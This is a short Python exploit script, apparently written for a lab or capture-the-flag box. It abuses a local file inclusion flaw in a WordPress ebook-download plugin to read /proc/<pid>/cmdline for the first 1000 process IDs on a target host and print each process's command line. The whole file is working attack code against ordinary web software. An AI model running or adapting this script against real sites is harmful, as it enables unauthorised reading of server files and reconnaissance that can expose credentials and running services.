#!/usr/bin/python
#Crawl PIDS for /proc/<pid>/cmdline using LFI vulnerability in WordPress

from bs4 import BeautifulSoup
from urllib.request import urlopen
import re

#Crawl first 1000 PIDs
for i in range(1000):
   #LFI URL - Vuln in ebook plugin 
   html = urlopen("http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
   #print(html.code)

   bt = BeautifulSoup(html.read(), "lxml")
   ptags = bt.findAll('p')
   #Strip /proc/<pid>/cmdline from return and print remaining result
   for x in ptags:
      cmd = x.text.replace("/proc/"+str(i)+"/cmdline","")
      if len(cmd)>1:
         print("%d: %s"%(i,cmd))

